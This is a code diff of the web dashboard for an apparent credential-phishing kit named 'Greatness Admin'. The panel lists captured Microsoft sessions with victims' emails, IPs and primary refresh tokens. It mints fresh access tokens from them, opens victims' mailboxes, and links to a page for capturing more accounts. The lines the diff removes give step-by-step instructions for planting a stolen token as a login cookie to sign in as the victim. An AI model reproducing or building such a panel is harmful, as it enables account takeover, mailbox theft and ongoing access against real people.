@@ -6,17 +6,17 @@
     <title>Greatness Admin - Session Manager</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background: #0a0e27; color: #e0e0e0; padding: 20px; }
-        .container { max-width: 1600px; margin: 0 auto; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0a0e27; color: #e0e0e0; padding: 20px; }
+        .container { max-width: 1400px; margin: 0 auto; }
         .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #1e2342; }
-        .logo h1 { font-size: 24px; background: linear-gradient(135deg, #6c63ff, #3b82f6); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .logo h1 { background: linear-gradient(135deg, #6c63ff, #3b82f6); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
         .stat-card { background: #111635; border-radius: 16px; padding: 20px; border: 1px solid #1e2342; }
         .stat-title { font-size: 13px; color: #8b8fbf; margin-bottom: 8px; }
         .stat-value { font-size: 28px; font-weight: 700; }
         .tools-section { background: #111635; border-radius: 16px; padding: 20px; margin-bottom: 30px; }
         .tools-grid { display: flex; gap: 15px; flex-wrap: wrap; }
-        .tool-btn { background: linear-gradient(135deg, #1a1f3e, #111635); border: 1px solid #2a2f4e; padding: 10px 20px; border-radius: 10px; color: white; cursor: pointer; }
+        .tool-btn { background: #1a1f3e; border: 1px solid #2a2f4e; padding: 10px 20px; border-radius: 10px; color: white; cursor: pointer; }
         .tool-btn:hover { background: #3b82f6; }
         .table-container { background: #111635; border-radius: 16px; padding: 20px; overflow-x: auto; }
         table { width: 100%; border-collapse: collapse; }
@@ -24,29 +24,26 @@
         th { color: #8b8fbf; font-size: 12px; }
         td { font-size: 12px; }
         .btn-view { background: #10b981; border: none; padding: 6px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; margin: 2px; }
-        .btn-prt { background: #f59e0b; }
-        .btn-login { background: #8b5cf6; }
-        .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 750px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; max-height: 80vh; overflow-y: auto; }
+        .btn-mail { background: #8b5cf6; }
+        .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 700px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; max-height: 80vh; overflow-y: auto; }
         .token-modal pre { background: #0a0e27; padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 10px; word-break: break-all; white-space: pre-wrap; }
         .overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; }
-        .badge { background: #1e3a5f; padding: 4px 12px; border-radius: 20px; font-size: 11px; }
-        .loading { text-align: center; padding: 40px; color: #6b7280; }
+        .loading { text-align: center; padding: 40px; }
         .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .instruction-box { background: #1e293b; border-left: 3px solid #10b981; padding: 12px; margin-top: 10px; font-size: 11px; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <div class="logo"><h1>Greatness Admin</h1><p>Session & Token Manager</p></div>
-        <div class="badge" id="sessionCount">0 Sessions</div>
+        <div class="logo"><h1>Greatness Admin</h1><p>PRT Session Manager</p></div>
+        <div class="stat-value" id="sessionCount" style="font-size: 14px;">0 Sessions</div>
     </div>
 
     <div class="stats-grid">
         <div class="stat-card"><div class="stat-title">Total Sessions</div><div class="stat-value" id="totalSessions">0</div></div>
         <div class="stat-card"><div class="stat-title">With PRT</div><div class="stat-value" id="withPRT">0</div></div>
-        <div class="stat-card"><div class="stat-title">Domains</div><div class="stat-value" id="domainCount">0</div></div>
+        <div class="stat-card"><div class="stat-title">Total Users</div><div class="stat-value" id="totalUsers">0</div></div>
         <div class="stat-card"><div class="stat-title">Last Capture</div><div class="stat-value" id="lastCapture" style="font-size: 14px;">-</div></div>
     </div>
 
@@ -59,12 +56,10 @@
     </div>
 
     <div class="table-container">
-        <h3>📋 Captured Sessions</h3>
-        <td>
-            <thead>
-                <tr><th>Email</th><th>Domain</th><th>IP</th><th>Session Key</th><th>PRT</th><th>Actions</th></tr>
-            </thead>
-            <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading...  </td></tr></tbody>
+        <h3>📋 User Sessions</h3>
+        <table>
+            <thead><tr><th>Email</th><th>IP Address</th><th>User Agent</th><th>PRT Status</th><th>Captured At</th><th>Actions</th></tr></thead>
+            <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading... </td></tr></tbody>
         </table>
     </div>
 </div>
@@ -97,27 +92,26 @@
     function renderTable(sessions) {
         const tbody = document.getElementById('sessionsTableBody');
         if (!sessions || sessions.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No sessions. Click "Add Account" to authenticate.  </td></tr>';
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No sessions. Click "Add Account" to authenticate. </td></tr>';
             return;
         }
         
         tbody.innerHTML = sessions.map(s => `
             <tr>
-                <td style="color:#60a5fa; font-weight:500;">${escapeHtml(s.email)}</td>
-                <td><span style="background:#1e293b; padding:2px 6px; border-radius:4px;">${escapeHtml(s.domain)}</span></td>
+                <td style="color:#60a5fa;">${escapeHtml(s.email)}</td>
                 <td><code>${escapeHtml(s.ip || 'Unknown')}</code></td>
-                <td><code style="font-size:10px;">${escapeHtml(s.sessionKey?.substring(0, 16) || 'N/A')}...</code></td>
-                <td>${s.hasRefreshToken ? '<span style="color:#f59e0b;">✅ PRT</span>' : '<span style="color:#ef4444;">❌</span>'}</td>
+                <td style="max-width:200px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="${escapeHtml(s.userAgent)}">${escapeHtml((s.userAgent || 'Unknown').substring(0, 40))}...</td>
+                <td>${s.hasPRT ? '<span style="color:#10b981;">✅ PRT Captured</span>' : '<span style="color:#ef4444;">❌ No PRT</span>'}</td>
+                <td>${formatDate(s.capturedAt)}</td>
                 <td>
-                    <button class="btn-view" onclick="getAccessToken('${s.sid}')">🔑 Access Token</button>
-                    <button class="btn-view btn-prt" onclick="getLoginPayload('${s.sid}')">🔐 Login Payload</button>
-                    ${s.hasRefreshToken ? `<button class="btn-view btn-prt" onclick="viewPRT('${s.sid}')">🔄 PRT</button>` : ''}
+                    <button class="btn-view" onclick="viewToken('${s.sid}')">🔑 View Token</button>
+                    <button class="btn-view btn-mail" onclick="openMailbox('${s.sid}', '${escapeHtml(s.email)}')">📧 Open Mailbox</button>
                 </td>
             </tr>
         `).join('');
     }
 
-    async function getAccessToken(sid) {
+    async function viewToken(sid) {
         document.getElementById('tokenModal').style.display = 'block';
         document.getElementById('overlay').style.display = 'block';
         document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Getting fresh token...</div>';
@@ -125,84 +119,28 @@
         const data = await apiCall(`/api/session/token/${sid}`);
         
         if (data) {
-            document.getElementById('modalTitle').innerHTML = `🔐 Access Token - ${data.email}`;
+            document.getElementById('modalTitle').innerHTML = `🔐 Tokens - ${data.email}`;
             document.getElementById('tokenDetails').innerHTML = `
                 <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                <p><strong>Domain:</strong> ${escapeHtml(data.domain)}</p>
-                <p><strong>Session Key:</strong> <code>${escapeHtml(data.sessionKey)}</code></p>
-                <p><strong>Access Token:</strong></p>
+                <p><strong>Access Token (Fresh):</strong></p>
                 <pre>${escapeHtml(data.access_token)}</pre>
-                <p><strong>Refresh Token (PRT):</strong></p>
+                <p><strong>PRT (Refresh Token):</strong></p>
                 <pre>${escapeHtml(data.refresh_token)}</pre>
-                <div class="instruction-box">
-                    <strong>🔧 How to use this token:</strong><br>
-                    1. Open browser DevTools (F12) → Application → Cookies<br>
-                    2. Navigate to <strong>https://login.microsoftonline.com</strong><br>
-                    3. Add a cookie named <strong>"accesstoken"</strong> with the value above<br>
-                    4. Add a cookie named <strong>"login_hint"</strong> with value "${escapeHtml(data.email)}"<br>
-                    5. Refresh the page - you should be logged in as ${escapeHtml(data.email)}
-                </div>
-                <p style="font-size: 11px; color: #10b981; margin-top: 10px;">✅ Token expires in ${data.expires_in} seconds</p>
+                <p style="font-size: 11px; color: #10b981;">✅ Access token refreshed and valid for ${data.expires_in} seconds</p>
+                <p style="font-size: 11px; color: #f59e0b;">🔄 PRT is permanent - use it to generate new access tokens</p>
             `;
         }
     }
 
-    async function getLoginPayload(sid) {
-        document.getElementById('tokenModal').style.display = 'block';
-        document.getElementById('overlay').style.display = 'block';
-        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Generating login payload...</div>';
-        
-        const data = await apiCall(`/api/session/login/${sid}`);
-        
-        if (data) {
-            document.getElementById('modalTitle').innerHTML = `🔐 Login Payload - ${data.email}`;
-            document.getElementById('tokenDetails').innerHTML = `
-                <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                <p><strong>Domain:</strong> ${escapeHtml(data.domain)}</p>
-                <p><strong>Access Token:</strong></p>
-                <pre>${escapeHtml(data.access_token)}</pre>
-                <p><strong>PRT (Refresh Token):</strong></p>
-                <pre>${escapeHtml(data.refresh_token)}</pre>
-                <div class="instruction-box">
-                    <strong>🔧 Direct Login URL (copy and paste in browser):</strong><br>
-                    <a href="${escapeHtml(data.direct_login_url)}" target="_blank" style="color:#60a5fa; word-break:break-all;">${escapeHtml(data.direct_login_url.substring(0, 100))}...</a>
-                </div>
-                <div class="instruction-box">
-                    <strong>📋 Instructions for DevTools:</strong><br>
-                    <strong>Step 1:</strong> Open login.live.com or login.microsoftonline.com<br>
-                    <strong>Step 2:</strong> Open DevTools (F12) → Application → Cookies<br>
-                    <strong>Step 3:</strong> Add these cookies to <strong>https://login.microsoftonline.com</strong>:<br>
-                    &nbsp;&nbsp;• <strong>accesstoken</strong> = ${escapeHtml(data.access_token.substring(0, 50))}...<br>
-                    &nbsp;&nbsp;• <strong>login_hint</strong> = ${escapeHtml(data.email)}<br>
-                    &nbsp;&nbsp;• <strong>domain_hint</strong> = ${escapeHtml(data.domain)}<br>
-                    <strong>Step 4:</strong> Refresh the page - you will be logged in as ${escapeHtml(data.email)}
-                </div>
-            `;
-        }
-    }
-
-    async function viewPRT(sid) {
-        const data = await apiCall(`/api/session/tokens/${sid}`);
-        if (data) {
-            document.getElementById('modalTitle').innerHTML = `🔄 Primary Refresh Token (PRT) - ${data.email}`;
-            document.getElementById('tokenDetails').innerHTML = `
-                <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                <p><strong>PRT (Refresh Token):</strong></p>
-                <pre>${escapeHtml(data.refresh_token)}</pre>
-                <p style="font-size: 11px; color: #f59e0b;">⚠️ This PRT is PERMANENT and can generate new access tokens anytime.</p>
-                <p style="font-size: 11px; color: #10b981;">✅ Use this PRT with /api/session/token/${sid} to get fresh access tokens.</p>
-            `;
-            document.getElementById('tokenModal').style.display = 'block';
-            document.getElementById('overlay').style.display = 'block';
-        }
+    function openMailbox(sid, email) {
+        window.open(`/mailbox.html?sid=${sid}&email=${encodeURIComponent(email)}`, '_blank');
     }
 
     function updateStats(sessions) {
         document.getElementById('totalSessions').innerText = sessions.length;
-        const withPRT = sessions.filter(s => s.hasRefreshToken).length;
+        const withPRT = sessions.filter(s => s.hasPRT).length;
         document.getElementById('withPRT').innerText = withPRT;
-        const uniqueDomains = new Set(sessions.map(s => s.domain));
-        document.getElementById('domainCount').innerText = uniqueDomains.size;
+        document.getElementById('totalUsers').innerText = sessions.length;
         if (sessions.length > 0) document.getElementById('lastCapture').innerHTML = formatDate(sessions[0].capturedAt);
     }
 
@@ -211,18 +149,8 @@
         document.getElementById('overlay').style.display = 'none';
     }
 
-    function openAddAccount() { 
-        window.open('/generate-auth-page', '_blank', 'width=600,height=700');
-        setTimeout(loadSessions, 3000);
-    }
-    
-    async function clearAll() { 
-        if(confirm('Clear all sessions?')){ 
-            await apiCall('/api/sessions/clear',{method:'DELETE'}); 
-            loadSessions(); 
-        } 
-    }
-    
+    function openAddAccount() { window.open('/generate-auth-page', '_blank', 'width=600,height=700'); setTimeout(loadSessions, 3000); }
+    async function clearAll() { if(confirm('Clear all sessions?')){ await apiCall('/api/sessions/clear',{method:'DELETE'}); loadSessions(); } }
     function formatDate(d){ return d ? new Date(d).toLocaleString() : 'Unknown'; }
     function escapeHtml(str){ if(!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
 
